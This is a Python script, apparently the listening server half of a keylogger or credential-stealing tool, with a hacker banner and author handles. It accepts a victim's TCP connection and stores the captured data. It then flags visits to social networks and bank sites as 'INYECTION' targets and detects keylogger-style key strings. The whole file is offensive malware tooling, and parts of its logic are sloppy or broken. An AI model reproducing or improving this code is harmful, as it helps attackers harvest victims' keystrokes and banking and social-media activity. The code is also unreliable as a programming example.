
# Development by: @crypt0r

import socket
import os, sys
from cipher import Cipher_sha256


class COLORS_SHELL:

    color_BANK = "\x1b[1;32m"
    color_SOCIAL = "\x1b[1;35m"
    color_NONE  = "\x1b[1;37m"
    color_RED = "\x1b[1;31m"
    color_BLUE = "\x1b[1;34m"


stringCast = [COLORS_SHELL.color_BLUE + "SCL_INYECTION"+ COLORS_SHELL.color_NONE,COLORS_SHELL.color_BANK + "[BANK INYECTION]"+ COLORS_SHELL.color_NONE]

SocialNetworks_Handler = ["www.facebook.com","www.twitter.com","www.pornhub.com","www.test.com"]
BANKS_Netwoks = ["www.onlysite.com","www.sitefake.com","www.sitefake321.com"]
chars_Specials = ["<65027>qKey.ctrlc",".com"]
GET_HTTP1 = ["GET HTTP1.1/"]

def HttpServerHacking(IP_address,PORT_SOCK):
    print(COLORS_SHELL.color_RED + "[*]" + COLORS_SHELL.color_NONE + " Upload Server ...")
    print("""
    <===========================================>
      ▄▄▄▄·  ▄▌  ▄• ▄▌▄▄▄ .▄▄▄ . ▄· ▄▌▄▄▄ .
      ▐█ ▀█▪██•  █▪██▌▀▄.▀·▀▄.▀·▐█▪██▌▀▄.▀·
      ▐█▀▀█▄██▪  █▌▐█▌▐▀▀▪▄▐▀▀▪▄▐█▌▐█▪▐▀▀▪▄
      ██▄▪▐█▐█▌▐▌▐█▄█▌▐█▄▄▌▐█▄▄▌ ▐█▀·.▐█▄▄▌
      ·▀▀▀▀ .▀▀▀  ▀▀▀  ▀▀▀  ▀▀▀   ▀ •  ▀▀▀ 
    <===========================================>
      _________________________

        Author: @LaDarka
      _________________________
      """)

    shadow_file = str(input(COLORS_SHELL.color_BLUE+"[*]"+COLORS_SHELL.color_NONE+"Choose your file to create: "))
    CipherModeEncrypt = Cipher_sha256()
    Cipher_filewithstyle = CipherModeEncrypt.Cipher_256(shadow_file)
    print(COLORS_SHELL.color_BLUE + "[*]" + COLORS_SHELL.color_NONE + " New file Encrypt -> ", CipherModeEncrypt.Cipher_256(shadow_file),'\n')    
    HttpServer_TCP = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    HttpServer_TCP.bind((IP_address,PORT_SOCK))
    HttpServer_TCP.listen(2)  # two connections type([2])
    connectionsHTTP , addressHTTP = HttpServer_TCP.accept()
    print(COLORS_SHELL.color_RED +  "[IP/TCP]", COLORS_SHELL.color_NONE + addressHTTP[0],"DETECTED! \n")

    loggerBugger = connectionsHTTP.recv(1024)
    decoder_typeCipher =  loggerBugger.decode("UTF-8")

    with open(Cipher_filewithstyle,"w") as FileEncrypt:
      FileEncrypt.write(decoder_typeCipher)
      FileEncrypt.close()


    with open(Cipher_filewithstyle) as FILE_ENCRYPT:
        for line in FILE_ENCRYPT:
            if(SocialNetworks_Handler[0] in line):
               print(stringCast[0] +" "+ GET_HTTP1[0],SocialNetworks_Handler[0])
            if(SocialNetworks_Handler[1] in line):
               print(stringCast[0] +" "+GET_HTTP1[0-1+1],SocialNetworks_Handler[1])
               print("ok")

            if(SocialNetworks_Handler[2] in line):
               print(stringCast[0] +" "+GET_HTTP1,SocialNetworks_Handler[2])

            if(chars_Specials[0] in line):
               print(COLORS_SHELL.color_RED +"[@EMAIL-headers] " + COLORS_SHELL.color_NONE + "characters<@Email.com>")

            if(BANKS_Netwoks[0] in line):
                print(stringCast[1]+" "+GET_HTTP1[0], BANKS_Netwoks[0])
            if BANKS_Netwoks[1] in line:
                print(stringCast[1]+" "+GET_HTTP1[0], BANKS_Netwoks[1])


            if BANKS_Netwoks[2] in line:
                print(stringCast[1]+" "+GET_HTTP1[0],BANKS_Netwoks[2])

            for masterCloud in SocialNetworks_Handler:
                if masterCloud == SocialNetworks_Handler[0]:
                   masterStr = masterCloud[4:12]
                   if masterStr in line:
                      print(stringCast[0],"{0} {1}".format(GET_HTTP1[0],masterStr))

                if masterCloud == SocialNetworks_Handler[1]:
                   masterStr = masterCloud[4:12-1]
                   if masterStr in line:
                      print(stringCast[0],"{0} {1}".format(GET_HTTP1[0-1+1],masterStr))
                if masterCloud == SocialNetworks_Handler[2]:
                   masterStr = masterCloud[4:12-1]
                   if masterStr in line:
                      print(stringCast[0] ,"{0} {1}".format(GET_HTTP1[0] ,masterStr))

                if masterCloud == SocialNetworks_Handler[3]:
                   masterStr = masterCloud[4:12]
                   if masterStr in line:
                      print(stringCast[0] ,"{0} {1}".format(GET_HTTP1[0-1+1] ,masterStr))

            for masterCloudBanks in BANKS_Netwoks:
                if(masterCloudBanks == BANKS_Netwoks[0]):
                   masterBank = masterCloudBanks[4:11]
                   if (masterBank in line):
                      print(stringCast[1] ,"{1} {0}".format(GET_HTTP1[0], masterBank))
                if (masterCloudBanks == BANKS_Netwoks[1]):
                   masterBank = masterCloudBanks[4:8]
                   if (masterBank in line):
                      print(stringCast[1],"{1} {0}".format(GET_HTTP1[0], masterBank))
                if (masterCloudBanks == BANKS_Netwoks[2]):
                   masterBank = masterCloudBanks[4:13]
                   if masterBank in line:
                      print(stringCast[1],"{0} {1}".format("GET HTTP.1.1/",masterBank))


HttpServerHacking("192.168.1.72",9091)
